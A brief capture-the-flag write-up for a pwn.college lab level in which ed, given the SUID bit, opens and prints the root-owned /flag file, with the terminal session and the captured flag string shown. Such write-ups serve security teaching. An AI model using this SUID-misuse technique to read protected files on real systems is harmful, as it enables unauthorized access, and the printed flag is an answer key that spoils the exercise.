`ed` is a line based text editor and is the oldest text editor in Unix.

Read `ed --help`

https://www.geeksforgeeks.org/ed-command-in-linux-with-examples/

If you read this article you will find this:

`Example 4: To print all the lines that we inserted in the buffer by using “, p”.`

```bash
hacker@program-misuse-level-36:~$ cd /
hacker@program-misuse-level-36:/$ cd challenge/
hacker@program-misuse-level-36:/challenge$ ls
babysuid_level36
hacker@program-misuse-level-36:/challenge$ ./babysuid_level36 
Welcome to ./babysuid_level36!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/ed.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ed!
hacker@program-misuse-level-36:/challenge$ ed /flag
57
,p
pwn.college{IvthSxvBrjaz0S4H7DEXdO7usrH.0FO3EDL0AjNzQzW}
Q
hacker@program-misuse-level-36:/challenge$ 
```

`Q` is for exiting from `ed` editor.